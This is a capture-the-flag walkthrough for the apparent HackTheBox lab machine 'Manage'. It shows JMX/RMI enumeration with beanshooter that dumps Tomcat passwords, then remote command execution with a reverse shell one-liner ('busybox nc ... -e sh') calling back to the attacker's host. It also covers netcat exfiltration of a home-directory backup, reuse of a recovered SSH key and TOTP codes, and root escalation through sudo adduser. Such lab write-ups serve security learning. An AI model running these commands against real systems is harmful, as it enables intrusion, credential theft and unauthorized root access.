# Manage - Easy

```sh
sudo vim /etc/hosts
# add manage.htb

nmap -T4 -p- -A -Pn -v manage.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
    * 2222/tcp - java-rmi - Java RMI
    * 8080/tcp - http - Apache Tomcat 10.1.19
    * 43435/tcp - java-rmi - Java RMI
    * 46019/tcp - tcpwrapped

* RMI (Remote Method Invocation) is a protocol used in Java for calling methods remotely; its components include interface, implementation & client

* ```nmap``` scan detects RMI endpoints via the ```rmi-dumpregistry``` script, and gives us this output:

    ```sh
    2222/tcp  open  java-rmi   Java RMI
    | rmi-dumpregistry: 
    |   jmxrmi
    |     javax.management.remote.rmi.RMIServerImpl_Stub
    |     @127.0.1.1:43435
    |     extends
    |       java.rmi.server.RemoteStub
    |       extends
    |_        java.rmi.server.RemoteObject
    ```

    * we have ```jmxrmi```, the remote implementation; JMX (Java Management Extensions) over RMI could be used here

    * the RMI service is running on port 43435 - this is the endpoint which would execute the remotely invoked methods

* checking the webpage on port 8080, we get the landing page for Apache Tomcat 10.1.19

* we have links to the Manager App at '/manager/html', and the Host Manager at '/host-manager/html'

* if we try to access either of these links, we get 403 Access Denied; we can check the RMI service for any clues next

* [enumerating Java RMI](https://swisskyrepo.github.io/PayloadsAllTheThings/Java%20RMI/):

    * we can use [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) for scanning Java RMI services:

        ```sh
        git clone https://github.com/qtc-de/remote-method-guesser

        cd remote-method-guesser

        mvn package
        # install rmg

        # we can update auto-complete if needed
        # or run the '.jar' file directly

        java -jar target/rmg-5.1.0-jar-with-dependencies.jar -h

        java -jar target/rmg-5.1.0-jar-with-dependencies.jar enum manage.htb 2222
        ```
    
    * ```rmg``` scan shows ```RMISocketFactory``` associated with the endpoint on port 43435; Google shows that it is a class within RMI, used to create sockets for client-server communication

    * we can also check with [beanshooter](https://github.com/qtc-de/beanshooter) for attacking JMX services:

        ```sh
        git clone https://github.com/qtc-de/beanshooter

        cd beanshooter

        mvn package
        # install beanshooter

        java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar -h

        java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar info manage.htb 2222
        # list available attributes
        ```
    
    * ```beanshooter``` lists multiple attributes available; from the listed 'ObjectName' values, we can see that these are meant for the webapp running on port 8080

    * from the verbose output, for the MBean class ```org.apache.catalina.mbeans.UserMBean```, we get the username 'admin'; for the same class, we have an object ```Users:type=User,username="admin",database=UserDatabase``` with 'password' as one of the attributes

    * we can use ```beanshooter``` to list attributes as well:

        ```sh
        java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar info manage.htb 2222 'Users:type=User,username="admin",database=UserDatabase'
        # verify the info is correct, using the 'ObjectName' field

        java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar attr manage.htb 2222 'Users:type=User,username="admin",database=UserDatabase' password
        # check 'password' attribute value
        ```
    
    * the password value is listed as 'onyRPCkaG4iX72BrRtKgbszd' for 'admin' user; similarly, we can check the other 'password' attribute values from the verbose info output:

        ```sh
        java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar info manage.htb 2222 'Users:type=User,username="manager",database=UserDatabase'

        java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar attr manage.htb 2222 'Users:type=User,username="manager",database=UserDatabase' password
        # check 'password' attribute value
        ```
    
    * we get the password 'fhErvo2r9wuTEYiYgt' for the 'manager' user

    * we can try using the other commands for ```beanshooter``` to see if we can get RCE:

        ```sh
        sudo tcpdump -i tun0 icmp
        # set listener for pings

        # try standard MBean execution
        java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar standard manage.htb 2222 exec 'ping -c 3 10.10.14.62'
        # this works, and we get ICMP packets

        nc -nvlp 4444
        # setup listener

        java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar standard manage.htb 2222 exec 'busybox nc 10.10.14.62 4444 -e sh'
        # use revshell one-liner
        ```

* using ```beanshooter``` standard MBean execution, we are able to get reverse shell:

    ```sh
    id
    # 'tomcat' user

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # press Enter twice

    pwd
    # '/'

    ls -la

    ls -la /opt
    # we have 'tomcat' folder here

    ls -la /opt/tomcat

    cat /opt/tomcat/user.txt
    # user flag

    ls -la /home
    # we have users 'karl' & 'useradmin'

    ls -la /home/karl
    # has '.ssh' folder, but not readable

    ls -la /home/useradmin
    # has a readable '.ssh' folder and a 'backups' folder

    ls -la /home/useradmin/.ssh
    ```

* the 'useradmin' user has SSH keys, but we can read only 'id_ed25519.pub' - we can copy this file to attacker:

    ```sh
    cat /home/useradmin/.ssh/id_ed25519.pub
    # copy the key contents
    ```

    ```sh
    # in attacker
    vim id_ed25519.pub
    # paste key contents

    chmod 600 id_ed25519.pub

    ssh -i id_ed25519.pub useradmin@manage.htb
    # we get an error 'Load key "id_ed25519.pub": error in libcrypto'
    ```

* we cannot use the SSH key found in 'useradmin' directory; we can try re-using the passwords found earlier for 'karl' and 'useradmin':

    ```sh
    ssh karl@manage.htb
    # permission denied (publickey)

    ssh useradmin@manage.htb
    # permission denied (publickey)
    ```

    ```sh
    # in reverse shell
    # try using 'su'

    su karl
    # this fails

    su useradmin
    # the 'admin' user password works, but we are asked for a verification code
    ```

* the 'useradmin' user is re-using the password 'onyRPCkaG4iX72BrRtKgbszd' found earlier, but to switch this user we need a verification code

* checking the 'useradmin' home directory, we have a '.google_authenticator' file, but not readable by us; there is a non-default folder 'backups' as well:

    ```sh
    ls -la /home/useradmin

    ls -la /home/useradmin/backups
    # we have a 'backup.tar.gz' file here
    ```

* we can transfer the archive to attacker and check for any clues:

    ```sh
    # on attacker
    nc -nvlp 5555 > backup.tar.gz
    ```

    ```sh
    # in reverse shell
    
    cd /home/useradmin/backups

    nc 10.10.14.62 5555 -w 3 < backup.tar.gz
    ```

    ```sh
    # on attacker

    tar -xvf backup.tar.gz
    # this extracts all files

    ls -la
    ```

* decompressing the 'backup' archive file, we get a backup of the 'useradmin' home directory - now we are able to access the '.google_authenticator' file, as well as the '.ssh' directory

* we can try using this to login as 'useradmin':

    ```sh
    ls -la .ssh
    # we have the SSH private key accessible

    cat .google_authenticator
    # we have a list of TOTP codes - we can use the top ones first

    ssh -i .ssh/id_ed25519 useradmin@manage.htb
    # use first verification code '99852083'
    # this works

    sudo -l
    ```

* ```sudo -l``` shows that we can run the command ```/usr/sbin/adduser ^[a-zA-Z0-9]+$``` as sudo, without password

* GTFObins does not show any exploits or privesc commands for ```adduser```

* Googling about this shows that ```adduser``` can be used to create a new user, but the issue is the regex - it accepts only letters & numbers, without spaces

* we can try creating a new user to see if it works:

    ```sh
    sudo /usr/sbin/adduser tester
    # it works
    # but it creates a standard user

    cat /etc/passwd
    # new user 'tester' created

    cat /etc/group
    # new group 'tester' created
    ```

* as the regex limits us from using spaces or additional flags, we need to create a new user

* as ```adduser``` creates a new user and a new group of the same name, we can try to abuse this behaviour

* Googling to check Linux groups with higher privileges lists groups like ```sudo```, ```wheel```, ```root```, ```adm``` and ```admin```

* checking the list of groups from ```/etc/group```, we can see the 'admin' group is not listed; and ```/etc/passwd``` confirms there is no 'admin' user as well

* we can try creating an 'admin' user:

    ```sh
    sudo /usr/sbin/adduser admin

    # we can try switching to new user

    su admin
    # use same password as above

    # this works
    
    sudo -l
    # we can run all commands as all users

    sudo cat /root/root.txt
    # root flag
    ```
